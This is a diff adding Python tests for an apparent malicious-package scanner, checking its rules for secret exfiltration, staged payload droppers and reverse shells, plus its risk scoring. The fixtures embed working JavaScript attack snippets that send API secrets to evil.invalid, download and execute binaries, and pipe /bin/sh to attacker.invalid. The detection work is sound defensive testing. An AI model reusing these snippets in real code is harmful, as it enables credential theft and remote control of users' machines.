@@ -301,3 +301,222 @@ def test_p0_false_positive_and_correlation_remediations():
     )
     risk_high, _ = assess([high_crit])
     assert risk_high == 'Critical concern'
+
+
+def test_confidence_propagation_end_to_end():
+    """Verify analyzer emits explicit confidence and it correctly propagates to Finding and assess()."""
+    # 1. Direct sensitive data exfiltration -> medium confidence -> High concern in assess()
+    direct_exfil = analyze({
+        'index.js': (
+            'const secret = process.env.API_SECRET;\n'
+            'fetch("https://evil.invalid/exfil", { body: secret });'
+        )
+    })
+    direct_findings = direct_exfil[2]
+    exfil_finding = next(f for f in direct_findings if f.rule == 'SENSITIVE_TRANSMISSION')
+    assert exfil_finding.confidence in ('medium', 'high')
+    risk_direct, _ = assess(direct_findings)
+    assert risk_direct == 'High concern'
+
+    # 2. Exfiltration with unknown function call -> downgraded to low confidence -> Review suggested in assess()
+    unknown_exfil = analyze({
+        'index.js': (
+            'const secret = process.env.API_SECRET;\n'
+            'const transformed = someObscureTransformation(secret);\n'
+            'fetch("https://evil.invalid/exfil", { body: transformed });'
+        )
+    })
+    unknown_findings = unknown_exfil[2]
+    low_exfil_finding = next(f for f in unknown_findings if f.rule == 'SENSITIVE_TRANSMISSION')
+    assert low_exfil_finding.confidence == 'low'
+    assert any('unmodeled' in lim.lower() for lim in low_exfil_finding.limitations)
+    risk_low, _ = assess(unknown_findings)
+    assert risk_low == 'Review suggested'
+
+
+def test_staged_artifact_correlation_and_negative_boundaries():
+    """Verify staged artifact correlation preserves artifact identity and rejects false positives."""
+    # Positive 1: Same module download -> write -> exact execution
+    same_mod = rules({
+        'index.js': (
+            'const https = require("https"); const fs = require("fs"); const cp = require("child_process");\n'
+            'https.get("https://evil.invalid/binary", (res) => {\n'
+            '  res.pipe(fs.createWriteStream("/tmp/staged_exec"));\n'
+            '  cp.exec("/tmp/staged_exec");\n'
+            '});'
+        )
+    })
+    assert 'STAGED_PAYLOAD_DROPPER' in same_mod
+    assert same_mod['STAGED_PAYLOAD_DROPPER'].confidence == 'high'
+
+    # Positive 2: Cross-module correlation with explicit import relationship
+    cross_mod = rules({
+        'download.js': (
+            'const https = require("https"); const fs = require("fs");\n'
+            'function fetchPayload() {\n'
+            '  https.get("https://evil.invalid/bin", (res) => {\n'
+            '    res.pipe(fs.createWriteStream("/tmp/cross_payload"));\n'
+            '  });\n'
+            '}\n'
+            'module.exports = { fetchPayload };'
+        ),
+        'index.js': (
+            'const { fetchPayload } = require("./download");\n'
+            'const cp = require("child_process");\n'
+            'fetchPayload();\n'
+            'cp.exec("/tmp/cross_payload");'
+        )
+    })
+    assert 'STAGED_PAYLOAD_DROPPER' in cross_mod
+
+    # Negative 1: Same module unrelated command (not executing the written file)
+    unrelated_cmd = rules({
+        'index.js': (
+            'const https = require("https"); const fs = require("fs"); const cp = require("child_process");\n'
+            'https.get("https://evil.invalid/bin", (res) => {\n'
+            '  res.pipe(fs.createWriteStream("/tmp/payload"));\n'
+            '});\n'
+            'cp.exec("npm run build");\n'
+            'cp.exec("git status");'
+        )
+    })
+    assert 'STAGED_PAYLOAD_DROPPER' not in unrelated_cmd
+
+    # Negative 2: Cross-module without import relationship (independent files)
+    independent_mod = rules({
+        'stager.js': (
+            'const https = require("https"); const fs = require("fs");\n'
+            'https.get("https://evil.invalid/bin", (res) => {\n'
+            '  res.pipe(fs.createWriteStream("/tmp/staged_bin"));\n'
+            '});'
+        ),
+        'unrelated_worker.js': (
+            'const cp = require("child_process");\n'
+            'cp.exec("/tmp/staged_bin");'
+        )
+    })
+    assert 'STAGED_PAYLOAD_DROPPER' not in independent_mod
+
+    # Negative 3: Substring path mismatch (e.g. "test.js" vs "npm test")
+    substring_mismatch = rules({
+        'index.js': (
+            'const https = require("https"); const fs = require("fs"); const cp = require("child_process");\n'
+            'https.get("https://cdn.example.invalid/script.js", (res) => {\n'
+            '  res.pipe(fs.createWriteStream("test.js"));\n'
+            '});\n'
+            'cp.exec("npm test");'
+        )
+    })
+    assert 'STAGED_PAYLOAD_DROPPER' not in substring_mismatch
+
+
+def test_reverse_shell_stream_linkage_coverage():
+    """Verify reverse-shell stream linkage covering socket-to-shell, shell-to-socket, and nested streams."""
+    # 1. Socket-to-shell piping
+    sock_to_shell = rules({
+        'index.js': (
+            'const net = require("net"); const cp = require("child_process");\n'
+            'const sock = net.connect(1337, "attacker.invalid");\n'
+            'const sh = cp.spawn("/bin/sh");\n'
+            'sock.pipe(sh.stdin);'
+        )
+    })
+    assert 'REVERSE_SHELL' in sock_to_shell
+    assert sock_to_shell['REVERSE_SHELL'].severity == 'critical'
+    assert sock_to_shell['REVERSE_SHELL'].confidence == 'high'
+
+    # 2. Shell-to-socket piping
+    shell_to_sock = rules({
+        'index.js': (
+            'const net = require("net"); const cp = require("child_process");\n'
+            'const sock = net.connect(1337, "attacker.invalid");\n'
+            'const sh = cp.spawn("/bin/sh");\n'
+            'sh.stdout.pipe(sock);'
+        )
+    })
+    assert 'REVERSE_SHELL' in shell_to_sock
+    assert shell_to_sock['REVERSE_SHELL'].severity == 'critical'
+    assert shell_to_sock['REVERSE_SHELL'].confidence == 'high'
+
+    # 3. Nested stream references (sh.stdio[0] and sh.stdio[1])
+    nested_stream = rules({
+        'index.js': (
+            'const net = require("net"); const cp = require("child_process");\n'
+            'const sock = net.connect(1337, "attacker.invalid");\n'
+            'const sh = cp.spawn("/bin/sh");\n'
+            'sh.stdio[0].pipe(sock);\n'
+            'sock.pipe(sh.stdio[1]);'
+        )
+    })
+    assert 'REVERSE_SHELL' in nested_stream
+    assert nested_stream['REVERSE_SHELL'].confidence == 'high'
+
+    # 4. Negative: Socket connection and unrelated shell process without stream linkage
+    unrelated_sock_shell = rules({
+        'index.js': (
+            'const net = require("net"); const cp = require("child_process");\n'
+            'const sock = net.connect(8080, "status.example.invalid");\n'
+            'const proc = cp.spawn("ls", ["-la"]);'
+        )
+    })
+    assert 'REVERSE_SHELL' not in unrelated_sock_shell
+
+    # 5. Negative: Multiple independent sockets and shell processes
+    multi_independent = rules({
+        'index.js': (
+            'const net = require("net"); const cp = require("child_process");\n'
+            'const sock1 = net.connect(80, "site1.invalid");\n'
+            'const sock2 = net.connect(443, "site2.invalid");\n'
+            'const proc1 = cp.spawn("git", ["status"]);\n'
+            'const proc2 = cp.spawn("node", ["build.js"]);'
+        )
+    })
+    assert 'REVERSE_SHELL' not in multi_independent
+
+
+def test_risk_assessment_scoring_validation():
+    """Verify calibrated severity/confidence scoring and deduplication in assess()."""
+    from backend.guardian.models import Finding, Evidence
+
+    ev1 = Evidence(file='index.js', line=1, column=1, snippet='code()', detail='detail')
+
+    # 1. High-severity, low-confidence finding produces 'Review suggested'
+    high_low = Finding(
+        id='hl1', rule='SENSITIVE_TRANSMISSION', title='Sensitive transmission', category='Data exposure',
+        severity='high', confidence='low', observed='obs', explanation='exp', implication='imp', recommendation='rec', evidence=[ev1]
+    )
+    risk, _ = assess([high_low])
+    assert risk == 'Review suggested'
+
+    # 2. High-severity, high-confidence finding produces 'High concern'
+    high_high = Finding(
+        id='hh1', rule='SENSITIVE_TRANSMISSION', title='Sensitive transmission', category='Data exposure',
+        severity='high', confidence='high', observed='obs', explanation='exp', implication='imp', recommendation='rec', evidence=[ev1]
+    )
+    risk, _ = assess([high_high])
+    assert risk == 'High concern'
+
+    # 3. Multiple independent findings do not inflate score beyond maximum effective rank
+    med_high = Finding(
+        id='mh1', rule='HOST_INFO_EXFILTRATION', title='Host info', category='Data exposure',
+        severity='medium', confidence='high', observed='obs', explanation='exp', implication='imp', recommendation='rec', evidence=[ev1]
+    )
+    risk, _ = assess([high_high, med_high])
+    assert risk == 'High concern'
+
+    # 4. Duplicate findings sharing the same evidence/title are deduplicated in rationale
+    dup1 = Finding(
+        id='d1', rule='STAGED_PAYLOAD_DROPPER', title='Downloaded file executed', category='Execution',
+        severity='high', confidence='high', observed='obs', explanation='exp', implication='imp', recommendation='rec', evidence=[ev1]
+    )
+    dup2 = Finding(
+        id='d2', rule='STAGED_PAYLOAD_DROPPER', title='Downloaded file executed', category='Execution',
+        severity='high', confidence='high', observed='obs', explanation='exp', implication='imp', recommendation='rec', evidence=[ev1]
+    )
+    risk, rationale = assess([dup1, dup2])
+    assert risk == 'High concern'
+    assert rationale.count('Downloaded file executed') == 1  # Deduplicated
+
+    # 5. Incomplete static traces append coverage warning suffix
+    _, rationale_incomplete = assess([high_high], source_coverage_incomplete=True)
+    assert 'Note that source inspection was incomplete; check coverage details.' in rationale_incomplete
